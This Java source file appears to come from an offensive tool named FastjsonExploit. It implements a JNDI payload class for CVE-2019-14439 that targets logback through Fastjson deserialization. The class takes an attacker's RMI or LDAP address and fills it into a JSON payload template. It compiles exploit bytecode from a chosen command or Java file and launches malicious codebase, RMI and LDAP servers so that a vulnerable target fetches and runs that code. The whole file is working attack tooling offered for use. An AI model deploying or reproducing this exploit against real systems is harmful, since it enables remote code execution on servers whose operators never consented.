package payloads;

import gadget.Gadget;
import payloads.annotation.Dependencies;
import payloads.annotation.PayloadType;
import payloads.annotation.VulVersion;
import server.CodebaseServer;
import util.*;

import java.io.IOException;

import static server.LDAPServer.lanuchLDAPServer;
import static server.RMIServer.lanuchRMIregister;

@PayloadType({PayloadType.JNDI})
@VulVersion({"CVE-2019-14439"})
@Dependencies({"ch.qos.logback:logback-core:1.3.0-alpha4"})
public class JNDIConnectionSource1 implements ObjectPayload{
    @Override
    public void process(String[] args) throws IOException {
        if(args.length != 3 && args.length != 4){
            System.out.println("[*] Usage: java -jar FastjsonExploit-[version].jar " + this.getClass().getSimpleName() + " [rmi/ldap address] [\"cmd:xxx|code:xxx.java\"]");
            return;
        }

        String address = args[1].trim();
        String expression = args[2].trim();

        if(!AddressParser.isAddress(address)){
            Alert.printValidAddress();
            return;
        }

        //Setp01:生成payload
        JarFileReader jarFileReader = new JarFileReader();
        String payload = jarFileReader.read("JNDIConnectionSource1.json");
        payload = payload.replace("###RMI_LDAP_ADDRESS###",address);
        System.out.println("[*] payload build success!");
        System.out.println("\n" + payload + "\n");

        //Setp02:生成本地exploit字节码
        Common.byteCode = Gadget.getJdbcRowSetImplExpCode(expression);


        //Setp03:启动服务
        AddressParser ap = new AddressParser();
        ap.parser(address);
        try {
            String server_host = ap.getHost();
            Integer service_port = Integer.valueOf(ap.getPort());
            int http_port = Util.getUnusePort("127.0.0.1");
            CodebaseServer.lanuchCodebaseURLServer(server_host, http_port);

            if (ap.getProtocol().equals("rmi")) {
                lanuchRMIregister(service_port, server_host, http_port);
            } else if (ap.getProtocol().equals("ldap")) {
                lanuchLDAPServer(service_port, server_host, http_port);
            }
        }catch (Exception e){
            e.printStackTrace();
            System.out.println("FastjsonExploit exit!");
            System.exit(0);
        }
    }
}
